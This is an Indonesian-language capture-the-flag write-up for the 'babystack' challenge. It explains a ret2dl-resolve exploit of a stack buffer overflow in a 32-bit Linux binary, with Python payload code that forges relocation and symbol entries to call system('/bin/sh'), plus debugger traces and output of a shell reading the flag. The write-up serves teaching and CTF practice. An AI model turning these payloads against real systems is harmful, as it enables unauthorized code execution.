# babystack


Soal ini diambil dari [sumber berikut](https://kileak.github.io/ctf/2018/0ctf-qual-babystack/)


## Analisa


Diberikan program dengan konfigurasi:
```
file babystack; checksec babystack
babystack: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=fec04eda780d4894712060ec109850576845402c, not stripped
[*] '/home/tempest/projects/cscctf/2019/qual/pwn/babystack/babystack'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```


Bug merupakan stack bof pada fungsi vuln, namun tidak diberikan libc untuk leak (program berjalan dengan ASLR). 



## Eksploitasi


Kita akan memanfaatkan dl-resolve, fungsi libc yang digunakan untuk melakukan resolve address pada setup `partial RELRO` atau lazy binding. Jika fungsi belum pernah dipanggil sebelumnya, libc akan melakukan push terhadap offset dan linkmap:
```
    0x8048300 <read@plt+0>     jmp    DWORD PTR ds:0x804a00c
->  0x8048306 <read@plt+6>     push   0x0
    0x804830b <read@plt+11>    jmp    0x80482f0

gef> tel $esp 4
0xffffcc74|+0x0000: 0xf7ffd940 -> 0x00000000 -> link map
0xffffcc78|+0x0004: 0x00000000 -> offset relokasi = 0
0xffffcc7c|+0x0008: 0x0804847c -> return address
0xffffcc80|+0x000c: 0x00000000
```


Kemudian akan dilakukan jump ke **\_dl\_runtime\_resolve**, dimana **\_dl\_fixup** akan dipanggil. Fungsi **\_dl\_fixup** ini mengembalikan alamat dari fungsi yang dicari dengan parameter linkmap dan offset relokasi. Snippet (disederhanakan agar mudah dimengerti):


```C
DL_FIXUP_VALUE_TYPE _dl_fixup(struct link_map *l, ELFW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

  // lakukan lookup dengan cara normal terlebih dulu
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
  {
  	...
  	result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
  	...
  	return result;
  }
  ...
```


Kita mempunyai kontrol atas area **.bss** dan argumen terhadap fungsi yang akan kita panggil. Kita bisa memanggil **\_dl\_lookup\_symbol\_x** agar mengembalikan alamat **system**. Untuk perhitungan yang dilakukan oleh program, dapat ditiru seperti ini:
```Python
target = 0x804a500
# readelf --all babystack
# [10] .rel.plt          REL             080482b0
relplt = 0x80482b0
# [ 5] .dynsym           DYNSYM          080481cc
dynsym = 0x80481cc
# [ 6] .dynstr           DYNSTR          0804822c
dynstr = 0x804822c
offset = target+28-relplt
symaddr = target+36
align = 0x10-((symaddr-dynsym) & 0xf)
symaddr += align
idx_dynsym = (symaddr-dynsym)/0x10
r_info = (idx_dynsym << 8) | 7
reloc = p32(exe.got["read"]) + p32(r_info)
st_name = symaddr+0x10-dynstr
sym = p32(st_name) + p32(0)*2 + p32(0x12)
```


Penyusunan payload kurang lebih seperti ini untuk stage pertama:
```Python
payload = 'a'*0x10
payload += p32(target)
payload += p32(exe.plt["read"])
payload += p32(0x08048519) # pop3 ret
payload += p32(0)
payload += p32(target)
payload += p32(0x50)
payload += p32(0x80482f0) # .plt
payload += p32(offset) # reloc_arg
payload += p32(0) # padding
payload += p32(target)
```


Setelah `read(0,0x804a500,0x100)`, kita pop parameter read agar dapat return ke `.plt`. Kita masukkan **reloc_arg** yang sudah kita hitung dan padding agar bisa dipanggil `system("/bin/sh");`. Berikut payload stage 2:
```Python
payload = "/bin/sh\x00"
payload = payload.ljust(0x1c,'\x00')
payload += reloc
payload += '?'*align
payload += sym
payload += "system\x00"
```
Payload dipad hingga 28 byte karena perhitungan `offset = 0x804a500+28-relplt` tadi. Selanjutnya ditambahkan GOT entry yang ingin dioverwrite dan relocation offsetnya. Setelah dilakukan alignment kita dapat memasukkan fake symbol table sendiri dan string "system".


Berikut adalah state program ketika dipanggil **\_dl\_runtime\_resolve**:
```
   -> 0x80482f6                  jmp    DWORD PTR ds:0x804a008

gef> tel $esp 4
0xffb51740|+0x0000: 0xf7fe6940 -> 0x00000000 -> linkmap
0xffb51744|+0x0004: 0x0000226c -> reloc_arg
0xffb51748|+0x0008: 0x00000000
0xffb5174c|+0x000c: 0x0804a500 -> "/bin/sh" -> parameter system

```


State ketika dipanggil **\_dl\_lookup\_symbol\_x**:
```
->0xf7fcdff3                  call   0xf7fc8e80
    \->  0xf7fc8e80                  push   ebp

0xf7fc8e80 (
   [sp + 0x0] = 0x0804a53c->"system",
   [sp + 0x4] = 0xf7fe6940->0x00000000
)
```


Ketika return to system:
```
->0xf7fd3e2b                  ret    0xc

gef> tel $esp 6
0xffb51738|+0x0000: 0xf7df2200 -> <system+0> sub esp, 0xc	<-$esp
0xffb5173c|+0x0004: 0x00000043 ("C"?)
0xffb51740|+0x0008: 0xf7fe6940 -> 0x00000000
0xffb51744|+0x000c: 0x0000226c ("l""?)
0xffb51748|+0x0010: 0x00000000
0xffb5174c|+0x0014: 0x0804a500 -> "/bin/sh"
```


Output script:
```
$ python exploit.py go
[*] '/home/tempest/projects/cscctf/2019/qual/pwn/babystack/babystack'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to babystack.problem.cscctf.com on port 11111: Done
[*] Switching to interactive mode
$ cat /home/babystack/flag
CCC{ret2dl-resolve_t0_Th3_Re5Cu3}
$ 
[*] Closed connection to babystack.problem.cscctf.com port 11111
```
